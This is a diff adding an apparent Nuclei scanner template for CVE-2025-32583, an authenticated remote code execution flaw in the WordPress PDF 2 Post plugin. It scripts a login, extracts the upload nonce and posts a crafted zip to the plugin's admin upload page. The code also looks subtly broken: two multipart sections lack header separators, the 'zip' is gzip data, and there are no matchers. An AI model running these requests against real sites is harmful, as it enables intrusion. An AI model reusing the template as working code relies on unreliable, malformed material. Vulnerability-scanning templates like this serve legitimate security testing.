@@ -1,0 +1,61 @@
+id: 2025-32583
+
+info:
+  name: WordPress PDF 2 Post RCE Exploit <= 2.4.0 - Authenticated Remote Code Execution
+  author: pussycat0x
+  severity: high
+  description: |
+    Improper Control of Generation of Code ('Code Injection') vulnerability in termel PDF 2 Post allows Remote Code Inclusion. This issue affects PDF 2 Post: from n/a through 2.4.0.
+  reference:
+    - https://github.com/Nxploited/CVE-2025-32583
+  tags: cve,cve2025,wordpress,wp-plugin,rce,plugin,pdf2rce
+
+variables:
+  filename: {{base64(gzip("Hello"))}}
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
+
+      - |
+        GET /wp-admin/edit.php?page=new-post-from-pdf HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /wp-admin/edit.php?page=new-post-from-pdf HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: keep-alive
+        Content-Length: 711
+        Content-Type: multipart/form-data; boundary=57fbacb93533400815c1e2ec994fe293
+
+        --57fbacb93533400815c1e2ec994fe293
+        Content-Disposition: form-data; name="pdf2post_upload_nonce"
+
+        {{pdf2post_upload_nonce}}
+        --57fbacb93533400815c1e2ec994fe293
+        Content-Disposition: form-data; name="_wp_http_referer"
+        /wp-admin/edit.php?page=new-post-from-pdf
+        --57fbacb93533400815c1e2ec994fe293
+        Content-Disposition: form-data; name="pdf_file_to_upload"; filename="{{randstr}}.zip"
+        Content-Type: application/zip
+        {{filename}}
+        --57fbacb93533400815c1e2ec994fe293--
+
+
+
+    extractors:
+      - type: regex
+        internal: true
+        group: 1
+        name: pdf2post_upload_nonce
+        part: body_2
+        regex:
+          - 'name="pdf2post_upload_nonce" value="([a-f0-9]+)"'
